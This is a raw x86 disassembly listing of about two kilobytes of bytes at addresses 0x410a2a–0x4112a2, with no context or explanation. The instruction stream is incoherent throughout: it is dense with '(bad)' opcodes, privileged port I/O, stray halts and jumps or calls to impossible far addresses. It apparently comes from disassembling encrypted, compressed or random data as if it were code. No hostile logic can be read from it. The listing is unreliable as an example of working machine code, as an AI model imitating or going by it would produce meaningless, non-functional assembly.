  410a2a:	aam    0xb7
  410a2c:	cli    
  410a2d:	(bad)  
  410a2f:	in     al,dx
  410a30:	rol    dl,1
  410a32:	mov    esp,0xe4bdc7b9
  410a37:	loopne 0x410a00
  410a39:	(bad)  
  410a3b:	pop    es
  410a3c:	(bad)  
  410a3d:	in     al,0xc2
  410a3f:	jmp    0xe203e317
  410a44:	icebp  
  410a45:	mov    bh,0xe9
  410a47:	cmc    
  410a48:	mov    bl,0xba
  410a4a:	call   0xca19c033
  410a4f:	dec    bh
  410a51:	lock (bad) 
  410a53:	stc    
  410a54:	rol    DWORD PTR [ebx],cl
  410a56:	inc    edx
  410a58:	fdivr  st(7),st
  410a5a:	lock add ebx,edi
  410a5d:	add    eax,0xc4def8c4
  410a62:	ror    eax,cl
  410a64:	retf   0xbcf2
  410a67:	(bad)  
  410a68:	(bad)
  410a6b:	jmp    0xeddb:0xbcd2ead9
  410a72:	out    dx,eax
  410a73:	fadd   QWORD PTR [eax]
  410a75:	icebp  
  410a76:	idiv   ebx
  410a78:	hlt    
  410a79:	test   dl,0xf6
  410a7c:	mov    esp,0x5000d04
  410a81:	retf   
  410a82:	mov    eax,0xe8d0e7d1
  410a87:	out    dx,eax
  410a88:	(bad)  
  410a89:	in     al,dx
  410a8a:	lock retf 0xefbe
  410a8e:	cli    
  410a8f:	mov    ebx,0xd4fe01b9
  410a94:	fdivp  st(3),st
  410a96:	fst    st(6)
  410a98:	aad    0xf8
  410a9a:	inc    DWORD PTR [ecx]
  410a9c:	enter  0xe2ee,0xa
  410aa0:	add    dh,BYTE PTR [ecx-0x4c1e4f1f]
  410aa6:	lods   eax,DWORD PTR ds:[esi]
  410aa7:	out    0xea,al
  410aa9:	jmp    0xbe0ce99e
  410aae:	mov    dl,0xdb
  410ab0:	aam    0xbf
  410ab2:	mov    ebp,0xdbe4cdf1
  410ab7:	add    eax,0xfce6d6fb
  410abc:	into   
  410abd:	fsub   st,st(3)
  410abf:	or     edx,edx
  410ac1:	(bad)  
  410ac3:	jecxz  0x410a9a
  410ac5:	cmc    
  410ac6:	cmc    
  410ac7:	mov    dh,0xd4
  410ac9:	repz out 0xdb,eax
  410acc:	rcl    ecx,1
  410ace:	in     eax,dx
  410acf:	(bad)  
  410ad1:	add    ebp,esi
  410ad3:	mov    ecx,0xe003fee0
  410ad8:	rol    ch,cl
  410ada:	add    al,BYTE PTR ds:0x13fdebc0
  410ae0:	add    ebx,ecx
  410ae2:	scas   al,BYTE PTR es:[edi]
  410ae3:	xlat   BYTE PTR ds:[ebx]
  410ae4:	retf   0xd0e5
  410ae7:	out    0xf5,al
  410ae9:	aad    0xff
  410aeb:	jmp    0x410add
  410aed:	idiv   DWORD PTR [edx-0x210a241e]
  410af3:	sti    
  410af4:	repz div al
  410af7:	in     al,0xdf
  410af9:	clc    
  410afa:	add    bh,dh
  410afc:	add    al,0xfe
  410afe:	enter  0xecfe,0xe9
  410b02:	les    ebp,FWORD PTR [ebp-0x1023130f]
  410b08:	mov    dl,0xfa
  410b0a:	(bad)  
  410b0b:	jmp    0x410ac1
  410b0d:	fnstcw WORD PTR [ebx-0x312a1d24]
  410b13:	stc    
  410b14:	hlt    
  410b15:	loop   0x410ad3
  410b17:	(bad)  
  410b18:	jmp    0x410b16
  410b1a:	idiv   esp
  410b1c:	sti    
  410b1d:	cld    
  410b1e:	out    dx,al
  410b1f:	cli    
  410b20:	or     eax,ecx
  410b22:	mov    al,0xdc
  410b24:	mov    eax,0xb2d7d3ef
  410b2a:	mov    dl,0xb4
  410b2c:	aam    0xcd
  410b2e:	in     al,dx
  410b2f:	mov    ecx,0xc7fcdcfb
  410b34:	hlt    
  410b35:	aad    0xe4
  410b37:	add    al,BYTE PTR [edx]
  410b39:	push   es
  410b3a:	fnstcw WORD PTR [ebp-0x3222053b]
  410b40:	call   0xe526cd29
  410b45:	lock rcl esp,cl
  410b48:	mov    dl,0xd0
  410b4a:	clc    
  410b4b:	rcr    bh,1
  410b4d:	sti    
  410b4e:	ror    ah,cl
  410b50:	shl    al,1
  410b52:	fcmovnu st,st(6)
  410b54:	mov    esp,0xdfd5dd02
  410b59:	aam    0xf4
  410b5b:	std    
  410b5c:	fucomi st,st(4)
  410b5e:	add    al,0xd8
  410b60:	or     ebp,esp
  410b62:	call   0xec0afc5d
  410b67:	loope  0x410b1e
  410b69:	shr    edi,cl
  410b6b:	mov    edx,0xdaf4becf
  410b70:	(bad)  
  410b72:	hlt    
  410b73:	ret    
  410b74:	cli    
  410b75:	mov    ebp,0xc6dbc6f2
  410b7a:	pop    es
  410b7b:	or     bl,dl
  410b7d:	leave  
  410b7e:	adc    eax,DWORD PTR [ebx]
  410b80:	call   0xb134e44c
  410b85:	fdiv   QWORD PTR [edi-0x174d1613]
  410b8b:	call   0xe9ffe65c
  410b90:	cmc    
  410b91:	ret    0xe0ff
  410b94:	shr    ch,0xff
  410b97:	ret    0xd70b
  410b9a:	add    BYTE PTR [eax],cl
  410b9c:	aam    0xe0
  410b9e:	fmul   DWORD PTR [edx]
  410ba0:	call   0xce37ec69
  410ba5:	loope  0x410b68
  410ba7:	shl    eax,cl
  410ba9:	cmc    
  410baa:	fidiv  DWORD PTR [esi-0x32450727]
  410bb0:	fmul   st(4),st
  410bb2:	into   
  410bb3:	mov    eax,0xbdfae2d9
  410bb8:	in     eax,0xe0
  410bba:	loopne 0x410bb3
  410bbc:	add    bh,dh
  410bbe:	loope  0x410bc7
  410bc0:	or     al,0xe9
  410bc2:	ret    0xc2b0
  410bc5:	into   
  410bc6:	into   
  410bc7:	mov    al,0xea
  410bc9:	mov    dh,0xf3
  410bcb:	retf   0xefdd
  410bce:	enter  0xefd3,0xf4
  410bd2:	mov    dh,0xbd
  410bd4:	fadd   QWORD PTR ds:0xdbc10104
  410bda:	add    dl,cl
  410bdc:	or     eax,0xe0eec0d
  410be1:	in     eax,0xc4
  410be3:	fucom  st(4)
  410be5:	into   
  410be6:	leave  
  410be7:	icebp  
  410be8:	into   
  410be9:	in     eax,dx
  410bea:	shr    ch,cl
  410bec:	call   0xed1be1b5
  410bf1:	aam    0x0
  410bf3:	shl    bl,0xfa
  410bf6:	add    eax,0xd8e400e5
  410bfb:	or     BYTE PTR [edx],cl
  410bfd:	cld    
  410bfe:	jmp    0xaede:0xc7c2daec
  410c05:	jecxz  0x410bc8
  410c07:	jmp    0x410bdb
  410c09:	div    edx
  410c0b:	into   
  410c0c:	fcmovne st,st(4)
  410c0e:	mov    ebx,0xdd03f6da
  410c13:	repz cli 
  410c15:	mov    ebx,0xd1fcd6c3
  410c1a:	jmp    0xe29fb0d
  410c1f:	add    bh,ah
  410c21:	leave  
  410c22:	jmp    0xd1ec:0xcfd0e4e9
  410c29:	jmp    0x410c16
  410c2b:	mul    esi
  410c2d:	mov    ah,0xd0
  410c2f:	(bad)  
  410c30:	jecxz  0x410bf5
  410c32:	icebp  
  410c33:	(bad)  
  410c34:	cli    
  410c35:	pop    es
  410c36:	in     al,0xfe
  410c38:	rcr    ch,1
  410c3a:	add    al,0xfe
  410c3c:	clc    
  410c3d:	push   cs
  410c3e:	push   cs
  410c3f:	repz in eax,dx
  410c41:	iret   
  410c42:	loop   0x410bf4
  410c44:	shl    BYTE PTR [edi-0x4e254453],1
  410c4a:	mov    edx,0xfefbebfe
  410c4f:	retf   
  410c50:	mov    eax,0xdefbd8d6
  410c55:	(bad)  
  410c57:	jmp    0xeb08:0xcf03d9f2
  410c5e:	or     edi,esp
  410c60:	fucomip st,st(2)
  410c62:	scas   eax,DWORD PTR es:[edi]
  410c63:	fild   QWORD PTR [edi-0xe332e2f]
  410c69:	lock in eax,dx
  410c6b:	not    eax
  410c6d:	in     eax,dx
  410c6e:	mov    eax,0xede8b8d5
  410c73:	add    ebp,esp
  410c75:	idiv   BYTE PTR [edx+esi*8-0x80040fa]
  410c7c:	loop   0x410c7e
  410c7e:	enter  0xcb08,0xe8
  410c82:	out    0xf1,al
  410c84:	int3   
  410c85:	shr    DWORD PTR [ebp-0xa382425],cl
  410c8b:	out    0xd0,al
  410c8d:	int3   
  410c8e:	fmul   st,st(1)
  410c90:	(bad)  
  410c91:	mov    esp,0xf7d0f4e0
  410c96:	rcr    eax,1
  410c98:	(bad)  
  410c9a:	clc    
  410c9b:	add    bh,bl
  410c9d:	jmp    0xd6aa:0xc0e9f2c6
  410ca4:	jecxz  0x410c90
  410ca6:	mov    bl,0xc1
  410ca8:	aad    0xc0
  410caa:	sti    
  410cab:	mov    al,0xac
  410cad:	in     eax,0xeb
  410caf:	mov    edx,0xf8d0bde1
  410cb4:	rol    DWORD PTR [edi],0x5
  410cb7:	repz ret 0xc2
  410cbb:	(bad)  
  410cbc:	(bad)  
  410cbe:	push   cs
  410cbf:	in     eax,dx
  410cc0:	fchs   
  410cc2:	jmp    0xe9f7ba8a
  410cc7:	out    0xe2,al
  410cc9:	cmc    
  410cca:	lock icebp 
  410ccc:	call   0xd334db88
  410cd1:	rol    BYTE PTR [ecx],1
  410cd3:	fcmovnbe st,st(2)
  410cd5:	out    0xe1,al
  410cd7:	ret    
  410cd8:	(bad)  
  410cd9:	clc    
  410cda:	rol    DWORD PTR [ecx],0x2
  410cdd:	fmul   DWORD PTR [ecx]
  410cdf:	clc    
  410ce0:	loop   0x410cc9
  410ce2:	test   eax,0xc8c2cbd6
  410ce7:	vpmullw xmm3,xmm0,xmm1
  410ceb:	fucomip st,st(7)
  410ced:	mov    ch,0xb4
  410cef:	div    eax
  410cf1:	mul    ebx
  410cf3:	out    dx,al
  410cf4:	div    cl
  410cf6:	rcr    bl,0xfa
  410cf9:	(bad)  
  410cfa:	cld    
  410cfb:	add    esp,esi
  410cfd:	or     ah,bl
  410cff:	out    dx,eax
  410d00:	fucomp st(2)
  410d02:	mov    dl,0xc5
  410d04:	in     al,dx
  410d05:	aam    0xed
  410d07:	mov    dl,0xd5
  410d09:	retf   0xd3e7
  410d0c:	in     eax,0xff
  410d0e:	mov    edx,0xe000edf0
  410d13:	cld    
  410d14:	xlat   BYTE PTR ds:[ebx]
  410d15:	clc    
  410d16:	sar    ebp,cl
  410d18:	retf   0xfb01
  410d1b:	add    al,0xda
  410d1d:	or     eax,0xd0f8dec2
  410d22:	retf   
  410d23:	fucomip st,st(2)
  410d25:	repnz shl eax,1
  410d28:	jmp    0xe8f5d906
  410d2d:	call   0xda2fcce6
  410d32:	mov    ecx,0x5d5e2ce
  410d37:	in     al,0xde
  410d39:	fcmovnb st,st(2)
  410d3b:	test   BYTE PTR [ecx],0x0
  410d3e:	in     eax,0xeb
  410d40:	retf   0xcfcd
  410d43:	icebp  
  410d44:	shl    ah,0xe1
  410d47:	enter  0xd3ce,0xea
  410d4b:	iret   
  410d4c:	(bad)  
  410d4d:	fidivr WORD PTR [esi-0x180d1537]
  410d53:	shl    bl,0xf7
  410d56:	rol    ebx,1
  410d58:	loope  0x410d5d
  410d5a:	add    eax,0x50ada05
  410d5f:	out    dx,al
  410d60:	rcr    bh,cl
  410d62:	into   
  410d63:	repz in al,dx
  410d65:	icebp  
  410d66:	ror    edx,cl
  410d68:	shr    edx,1
  410d6a:	sti    
  410d6b:	mov    dh,0xf1
  410d6d:	fmul   st,st(2)
  410d6f:	(bad)  
  410d70:	mov    ecx,0xcddaffb7
  410d75:	loop   0x410d31
  410d77:	fiadd  WORD PTR [esi]
  410d79:	add    al,0x5
  410d7b:	(bad)  
  410d7c:	fucom  st(0)
  410d7e:	in     al,dx
  410d7f:	pop    es
  410d80:	leave  
  410d81:	leave  
  410d82:	(bad)  
  410d83:	(bad)  
  410d85:	(bad)  
  410d86:	repz into 
  410d88:	cmc    
  410d89:	test   al,0xcc
  410d8c:	dec    edx
  410d8e:	std    
  410d8f:	retf   0xddf5
  410d92:	sti    
  410d93:	fld    st(7)
  410d95:	(bad)  
  410d96:	fcmovnb st,st(1)
  410d98:	(bad)  
  410d99:	std    
  410d9a:	fsub   st,st(5)
  410d9c:	or     ch,ch
  410d9e:	loope  0x410d69
  410da0:	enter  0xbfb8,0xd6
  410da4:	out    dx,al
  410da5:	(bad)  
  410da6:	loopne 0x410d6c
  410da8:	repz mov dl,0xb7
  410dab:	mov    al,0xf5
  410dad:	fucomp st(0)
  410daf:	mov    ebx,0xd5c8b8da
  410db4:	jecxz  0x410d9b
  410db6:	cmc    
  410db7:	(bad)  
  410db8:	rol    BYTE PTR [edx+ebp*8],1
  410dbb:	iret   
  410dbc:	loopne 0x410dc5
  410dbe:	aam    0xf9
  410dc0:	(bad)  
  410dc1:	mov    dl,0xbc
  410dc3:	mov    ebp,0xdaecf0cf
  410dc8:	jmp    0xb9f1:0xd8cbc9d2
  410dcf:	add    dl,bh
  410dd1:	ffree  st(1)
  410dd3:	fdivr  st,st(2)
  410dd5:	mov    ebp,0xd1f8c3f0
  410dda:	cli    
  410ddb:	(bad)  
  410ddc:	or     eax,0x12c806fd
  410de1:	in     eax,dx
  410de2:	mov    esi,0xacc5a4d7
  410de7:	fcomi  st,st(2)
  410de9:	int    0xb8
  410deb:	lds    edi,FWORD PTR [edx-0x410ffc26]
  410df1:	add    bh,ch
  410df3:	loope  0x410db5
  410df5:	fdivrp st(5),st
  410df7:	repz les edi,FWORD PTR [edi+0xcc9c9c5]
  410dfe:	in     eax,0xd8
  410e00:	loopne 0x410df0
  410e02:	mov    bl,0xd0
  410e04:	lods   eax,DWORD PTR ds:[esi]
  410e05:	loop   0x410df1
  410e07:	sar    edx,0xf3
  410e0a:	aad    0xf3
  410e0c:	std    
  410e0d:	aad    0xcd
  410e0f:	leave  
  410e10:	fucomi st,st(0)
  410e12:	repz lock std 
  410e15:	shr    ebx,cl
  410e17:	add    bh,BYTE PTR [edi+esi*8-0x3b1e1e39]
  410e1e:	stc    
  410e1f:	iret   
  410e20:	adc    ecx,ebx
  410e22:	loop   0x410ded
  410e24:	in     al,0xe8
  410e26:	leave  
  410e27:	iret   
  410e28:	fxch   st(0)
  410e2a:	enter  0xccca,0xfb
  410e2e:	mov    dl,0xca
  410e30:	loop   0x410e2b
  410e32:	(bad)  
  410e33:	sar    cl,1
  410e35:	repz fst st(0)
  410e38:	in     eax,0xbf
  410e3a:	ret    0xcec0
  410e3d:	or     edi,eax
  410e3f:	(bad)  
  410e40:	loop   0x410e08
  410e42:	int    0xc0
  410e44:	ret    
  410e45:	stos   DWORD PTR es:[edi],eax
  410e46:	out    0xb3,eax
  410e48:	loope  0x410e3c
  410e4a:	int3   
  410e4b:	shl    cl,cl
  410e4d:	jmp    0x410e0c
  410e4f:	in     al,dx
  410e50:	(bad)  
  410e51:	in     al,dx
  410e52:	stc    
  410e53:	cmc    
  410e54:	fst    st(3)
  410e56:	fld    QWORD PTR [edi+eax*1]
  410e59:	(bad)  
  410e5b:	iret   
  410e5c:	add    al,0xfc
  410e5e:	(bad)  
  410e60:	call   0xe12fb50f
  410e65:	hlt    
  410e66:	out    0xdb,al
  410e68:	loop   0x410e32
  410e6a:	clc    
  410e6b:	mov    ah,0xff
  410e6d:	mov    ecx,0xfcd6f1f2
  410e72:	fsqrt  
  410e74:	lock (bad) 
  410e76:	rcr    bh,1
  410e78:	jmp    0xbd1b0872
  410e7d:	fchs   
  410e7f:	adc    ah,ch
  410e81:	rcr    esp,1
  410e83:	scas   al,BYTE PTR es:[edi]
  410e84:	rol    eax,cl
  410e86:	mov    bl,0xeb
  410e88:	rol    edi,cl
  410e8a:	rcl    eax,1
  410e8c:	stc    
  410e8d:	cli    
  410e8e:	mov    ebx,0xf8e9f4d2
  410e93:	shl    ecx,cl
  410e95:	(bad)  
  410e97:	aad    0xfa
  410e99:	jmp    0xfa4f16a5
  410e9e:	push   cs
  410e9f:	inc    BYTE PTR [ecx]
  410ea1:	shl    DWORD PTR [eax-0x4431019],1
  410ea7:	ret    0xebb0
  410eaa:	(bad)  
  410eac:	mov    al,0xe4
  410eae:	(bad)  
  410eaf:	hlt    
  410eb0:	repz call 0xd2f9f5b7
  410eb6:	pop    es
  410eb7:	fadd   st,st(7)
  410eb9:	(bad)  
  410eba:	cld    
  410ebb:	or     al,ah
  410ebd:	loop   0x410eab
  410ebf:	sar    edx,cl
  410ec1:	fsubrp st(4),st
  410ec3:	into   
  410ec4:	mov    ebp,0xc7cdc5f2
  410ec9:	in     eax,0xd9
  410ecb:	(bad)  
  410ecc:	int3   
  410ecd:	vaddsubpd xmm6,xmm5,xmm0
  410ed1:	(bad)  
  410ed3:	shl    al,1
  410ed5:	mov    ebp,0xe5e1d006
  410eda:	add    al,0xf4
  410edc:	aad    0x9
  410ede:	in     eax,dx
  410edf:	pmaxub mm5,QWORD PTR [eax-0x1e4d5148]
  410ee6:	mov    cl,0xc5
  410ee8:	mov    edx,0xf7f9f4af
  410eed:	call   0xd11be9e8
  410ef2:	(bad)  
  410ef3:	loopne 0x410edb
  410ef5:	ret    0xdaec
  410ef8:	aad    0xc7
  410efa:	stc    
  410efb:	push   cs
  410efc:	retf   
  410efd:	iret   
  410efe:	loope  0x410ee2
  410f00:	or     edi,eax
  410f02:	loopne 0x410efb
  410f04:	retf   
  410f05:	mov    ch,0xac
  410f07:	mov    cl,0xd4
  410f09:	out    dx,al
  410f0a:	imul   al
  410f0c:	sar    DWORD PTR [ebp-0x1127fc30],cl
  410f12:	sti    
  410f13:	mov    esi,0xe2e5bcf0
  410f18:	shl    ebp,1
  410f1a:	cli    
  410f1b:	fcmovbe st,st(6)
  410f1d:	cli    
  410f1e:	adc    ecx,DWORD PTR [edx]
  410f20:	icebp  
  410f21:	int    0xc4
  410f23:	(bad)
  410f26:	hlt    
  410f27:	in     al,dx
  410f28:	in     al,dx
  410f29:	out    0xb7,eax
  410f2b:	retf   0xd0ed
  410f2e:	(bad)  
  410f2f:	fst    st(6)
  410f31:	aam    0x3
  410f33:	push   es
  410f34:	lock out 0xe0,al
  410f37:	in     al,0xb
  410f39:	fcmovbe st,st(0)
  410f3b:	std    
  410f3c:	aad    0xc9
  410f3e:	jecxz  0x410f3d
  410f40:	push   es
  410f41:	mov    esi,0xe9f3bcf1
  410f46:	not    esp
  410f48:	xlat   BYTE PTR ds:[ebx]
  410f49:	fsub   st,st(5)
  410f4b:	cmc    
  410f4c:	clc    
  410f4d:	fdivr  st,st(1)
  410f4f:	ror    ecx,cl
  410f51:	cmc    
  410f52:	repz fdivp st(5),st
  410f55:	repz shr bl,1
  410f58:	les    ecx,FWORD PTR [eax]
  410f5a:	jmp    0xf8eb:0xcec6cbde
  410f61:	test   al,0xcd
  410f63:	shl    ecx,0xb1
  410f66:	repz (bad) 
  410f68:	lock leave 
  410f6a:	clc    
  410f6b:	jmp    0x410f47
  410f6d:	in     eax,0xcf
  410f6f:	cmc    
  410f70:	lock in eax,dx
  410f72:	mov    edx,0xc407dc00
  410f77:	add    edx,ecx
  410f79:	jmp    0xdafd:0xe7e2c4eb
  410f80:	loopne 0x410f3a
  410f82:	scas   al,BYTE PTR es:[edi]
  410f83:	mov    esi,0xebc0e3e2
  410f88:	rcr    cl,cl
  410f8a:	div    DWORD PTR [eax-0x12412946]
  410f90:	shl    esi,cl
  410f92:	mov    ebp,0xfdbf02f3
  410f97:	(bad)  
  410f99:	xlat   BYTE PTR ds:[ebx]
  410f9a:	or     eax,esi
  410f9c:	cld    
  410f9d:	(bad)  
  410f9e:	int3   
  410f9f:	enter  0xe7ea,0xde
  410fa3:	test   eax,0xc1cdede7
  410fa8:	test   cl,0xc7
  410fab:	repnz shl ah,1
  410fae:	mov    ch,0xdc
  410fb0:	dec    eax
  410fb2:	std    
  410fb3:	pop    es
  410fb4:	add    eax,0xe6bdf4d5
  410fb9:	(bad)  
  410fba:	loopne 0x410f80
  410fbc:	jmp    0xcf0d0cc5
  410fc1:	shr    ebx,1
  410fc3:	in     eax,0xb7
  410fc5:	mov    ebp,0xf6b7c1c7
  410fca:	mov    edx,0xbbd2cdf9
  410fcf:	lock std 
  410fd1:	leave  
  410fd2:	into   
  410fd3:	rcl    esp,0xfd
  410fd6:	loop   0x410f9a
  410fd8:	fdiv   st(5),st
  410fda:	ret    0xe9c1
  410fdd:	in     al,dx
  410fde:	jmp    0xab2e01cf
  410fe3:	scas   al,BYTE PTR es:[edi]
  410fe4:	lods   al,BYTE PTR ds:[esi]
  410fe5:	repnz out 0xcd,eax
  410fe8:	out    0xca,eax
  410fea:	int    0xeb
  410fec:	mov    edx,0xf0eab4f7
  410ff1:	hlt    
  410ff2:	cli    
  410ff3:	mov    ecx,0xdcf0bccc
  410ff8:	(bad)  
  410ff9:	out    0xe0,eax
  410ffb:	fsub   st(2),st
  410ffd:	leave  
  410ffe:	add    eax,ecx
  411000:	out    0xd8,eax
  411002:	iret   
  411003:	retf   0xadc7
  411006:	icebp  
  411007:	in     eax,dx
  411008:	(bad)  
  411009:	lds    edi,FWORD PTR [ebx-0x24251722]
  41100f:	(bad)  
  411010:	icebp  
  411011:	rcr    al,1
  411013:	mov    esi,0xf8c6f1ec
  411018:	loope  0x410feb
  41101a:	cld    
  41101b:	clc    
  41101c:	or     eax,0x110ae3eb
  411021:	lock ret 
  411023:	idiv   BYTE PTR [ebp-0x283f082c]
  411029:	enter  0xcdca,0xda
  41102d:	mov    edi,0xbed2d6d1
  411032:	pop    es
  411033:	out    0xdf,al
  411035:	ret    
  411036:	(bad)  
  411037:	jecxz  0x41101f
  411039:	(bad)  
  41103a:	fcmovnu st,st(6)
  41103c:	cmc    
  41103d:	jmp    0xf22c1c49
  411042:	test   eax,0xcac6ddf0
  411047:	int    0xed
  411049:	rol    bh,cl
  41104b:	mov    ecx,0xbef4c4ea
  411050:	add    bl,dl
  411052:	add    bh,dh
  411054:	int3   
  411055:	(bad)  
  411057:	cli    
  411058:	retf   
  411059:	shr    eax,1
  41105b:	retf   0xcff9
  41105e:	in     eax,dx
  41105f:	or     al,0xf2
  411061:	jecxz  0x411042
  411063:	out    dx,eax
  411064:	mov    ebp,0xdaacd7e4
  411069:	sti    
  41106a:	ror    bh,1
  41106c:	(bad)  
  41106e:	shl    edx,cl
  411070:	retf   0xf3e3
  411073:	(bad)  
  411074:	jecxz  0x41103c
  411076:	(bad)  
  411077:	stc    
  411078:	cli    
  411079:	ret    0x6e7
  41107c:	fadd   st,st(6)
  41107e:	(bad)  
  411081:	ror    esi,1
  411083:	iret   
  411084:	ror    ah,1
  411086:	in     al,dx
  411087:	repnz leave 
  411089:	mov    edx,0xf0d5b9f8
  41108e:	cli    
  41108f:	inc    BYTE PTR [ecx]
  411091:	mov    esi,0xbdfafce7
  411096:	loop   0x411077
  411098:	neg    ecx
  41109a:	fucomi st,st(3)
  41109c:	sti    
  41109d:	or     al,BYTE PTR [esi]
  41109f:	repnz pop es
  4110a1:	ret    0xe2f2
  4110a4:	in     al,0xd0
  4110a6:	out    dx,eax
  4110a7:	mov    bh,0xd3
  4110a9:	(bad)  
  4110aa:	in     al,dx
  4110ab:	out    dx,eax
  4110ac:	jmp    0x213e281
  4110b1:	inc    ecx
  4110b3:	mov    edi,0xdddcdd06
  4110b8:	out    0xc9,eax
  4110ba:	cli    
  4110bb:	(bad)  
  4110bc:	out    dx,al
  4110bd:	retf   0xe05
  4110c0:	jmp    0xe300d58a
  4110c5:	ret    
  4110c6:	shl    esi,0xe7
  4110c9:	icebp  
  4110ca:	mov    cl,0xcc
  4110cc:	mov    al,0xda
  4110ce:	iret   
  4110cf:	fdivp  st(3),st
  4110d1:	(bad)  
  4110d3:	jecxz  0x4110cd
  4110d5:	mov    esi,0xcbf4d3f5
  4110da:	aad    0x5
  4110dc:	or     eax,0xedd9c508
  4110e1:	lds    esi,FWORD PTR [eax-0x140f4e22]
  4110e7:	mov    dl,0xfa
  4110e9:	shl    dl,cl
  4110eb:	iret   
  4110ec:	mov    ebx,0x2c8c9f8
  4110f1:	sti    
  4110f2:	icebp  
  4110f3:	lock icebp 
  4110f5:	fnstsw WORD PTR [edi+eax*8-0x22f73810]
  4110fc:	(bad)  
  4110fd:	(bad)  
  4110ff:	or     al,0xa
  411101:	mov    edi,0xc0c7c9ec
  411106:	int    0xf5
  411108:	mov    ch,0xaf
  41110a:	enter  0xd0cc,0xdd
  41110e:	fdivr  st(5),st
  411110:	ret    0xc1ce
  411113:	add    edx,esi
  411115:	lds    eax,FWORD PTR [edx]
  411117:	(bad)  
  411118:	fcmovb st,st(3)
  41111a:	add    BYTE PTR [ecx],al
  41111c:	retf   0xe8f4
  41111f:	retf   
  411120:	btr    esi,ebp
  411123:	mov    esp,0xc1eef5e3
  411128:	loopne 0x411117
  41112a:	in     eax,dx
  41112b:	mov    ah,0xcd
  41112d:	in     eax,dx
  41112e:	iret   
  41112f:	in     al,dx
  411130:	fucomp st(7)
  411132:	xlat   BYTE PTR ds:[ebx]
  411133:	ret    
  411134:	loopne 0x4110f9
  411136:	repnz fld QWORD PTR [ebx]
  411139:	(bad)  
  41113b:	(bad)  
  41113c:	dec    edi
  41113e:	add    esp,eax
  411140:	or     ah,al
  411142:	mov    dl,0xeb
  411144:	ret    0xe2e6
  411147:	enter  0xb0cd,0xec
  41114b:	sti    
  41114c:	jmp    0xed0aef26
  411151:	aad    0xee
  411153:	out    dx,eax
  411154:	fst    st(2)
  411156:	mov    esp,0x4d5faf4
  41115b:	fsubr  st(6),st
  41115d:	cmc    
  41115e:	iret   
  41115f:	or     eax,0xdebcd2eb
  411164:	scas   al,BYTE PTR es:[edi]
  411165:	repnz (bad) 
  411167:	mov    bl,0xe7
  411169:	in     eax,0xd6
  41116b:	(bad)  
  41116c:	(bad)  
  41116d:	rcr    bh,cl
  41116f:	std    
  411170:	int3   
  411171:	in     al,dx
  411172:	into   
  411173:	stc    
  411174:	clc    
  411175:	call   eax
  411177:	rol    DWORD PTR [ebx],0xde
  41117a:	psubq  mm7,mm2
  41117d:	or     BYTE PTR [ecx+eiz*8],cl
  411180:	rol    bh,0xeb
  411183:	int3   
  411184:	mov    esi,0xc5b5acec
  411189:	lock (bad) 
  41118b:	mov    edi,0xd6dab8d6
  411190:	sti    
  411191:	fmul   st(4),st
  411193:	cld    
  411194:	aad    0xe0
  411196:	fadd   QWORD PTR [eax]
  411198:	(bad)  
  41119a:	(bad)  
  41119b:	retf   
  41119c:	(bad)  
  41119d:	bswap  esp
  41119f:	(bad)  
  4111a0:	out    dx,eax
  4111a1:	fsub   st,st(3)
  4111a3:	into   
  4111a4:	call   0xb5380966
  4111a9:	clc    
  4111aa:	xlat   BYTE PTR ds:[ebx]
  4111ab:	into   
  4111ac:	cli    
  4111ad:	jmp    0xe1fc:0xf5e2edb4
  4111b4:	clc    
  4111b5:	loope  0x411193
  4111b7:	fadd   QWORD PTR [edi]
  4111b9:	fcmovnbe st,st(5)
  4111bb:	add    ah,dl
  4111bd:	in     eax,dx
  4111be:	add    eax,DWORD PTR [ecx]
  4111c0:	or     al,0xc9
  4111c2:	(bad)
  4111c5:	rol    cl,1
  4111c7:	mov    ch,0xd1
  4111c9:	hlt    
  4111ca:	aad    0xd2
  4111cc:	retf   
  4111cd:	leave  
  4111ce:	aad    0xfe
  4111d0:	int3   
  4111d1:	hlt    
  4111d2:	cli    
  4111d3:	(bad)  
  4111d4:	in     al,dx
  4111d5:	add    dh,bh
  4111d7:	(bad)
  4111da:	in     al,0xfe
  4111dc:	(bad)  
  4111dd:	fsub   st,st(0)
  4111df:	repnz cld 
  4111e1:	jmp    0xe41ec2a7
  4111e6:	mov    bl,0xb6
  4111e8:	cmc    
  4111e9:	(bad)  
  4111ea:	(bad)  
  4111eb:	jmp    0xf8fe:0xf4d5c4d9
  4111f2:	idiv   DWORD PTR [eax-0x1d26193f]
  4111f8:	or     al,dh
  4111fa:	or     ecx,eax
  4111fc:	fneni(8087 only) 
  4111fe:	(bad)
  411201:	mov    ecx,0xf7c7eebd
  411206:	out    dx,al
  411207:	ret    
  411208:	lock mov edx,0xe9f1c5ec
  41120e:	jmp    0xfc17def5
  411213:	mov    esi,0xf9bdd0f0
  411218:	fxtract 
  41121a:	or     ah,ah
  41121c:	in     al,0x4
  41121e:	(bad)  
  41121f:	in     al,dx
  411220:	add    BYTE PTR [edi-0x160a3e1d],ch
  411226:	leave  
  411227:	call   0xdc3202dc
  41122c:	out    dx,eax
  41122d:	cli    
  41122e:	mov    eax,0xf7c1e8e3
  411233:	mov    esi,0xf8dde0d5
  411238:	cli    
  411239:	lock enter 0xfec8,0xc7
  41123e:	clc    
  41123f:	out    dx,eax
  411240:	adc    bh,BYTE PTR [ecx-0x3c500d20]
  411246:	jmp    0xfa26f915
  41124b:	dec    dh
  41124d:	(bad)  
  41124e:	mov    eax,0xfcfbeac9
  411253:	(bad)  
  411254:	push   ebx
  411256:	loope  0x411215
  411258:	or     ecx,ecx
  41125a:	enter  0xeff9,0xec
  41125e:	out    0xf8,al
  411260:	adc    ebp,edx
  411262:	loope  0x411217
  411264:	mov    bl,0xe6
  411267:	xlat   BYTE PTR ds:[ebx]
  411268:	xlat   BYTE PTR ds:[ebx]
  411269:	retf   0xe6d5
  41126c:	sti    
  41126d:	xlat   BYTE PTR ds:[ebx]
  41126e:	fnstsw WORD PTR [eax-0x131c0818]
  411274:	sar    DWORD PTR [edi-0x8fd150e],cl
  41127a:	out    0xc6,al
  41127c:	loop   0x41125e
  41127e:	(bad)  
  411280:	or     eax,0xeae4eaef
  411285:	loop   0x411282
  411287:	out    dx,al
  411288:	in     eax,0xc6
  41128a:	clc    
  41128b:	repz cli 
  41128d:	(bad)  
  41128e:	out    dx,al
  41128f:	test   BYTE PTR [ecx],0x1
  411292:	ret    
  411293:	std    
  411294:	add    ebx,ebp
  411296:	or     ebx,ebp
  411298:	jmp    0xe3260a79
  41129d:	in     al,0xfc
  41129f:	fsub   st(6),st
  4112a1:	out    dx,al
  4112a2:	mov    esi,0xe8c7e0d0
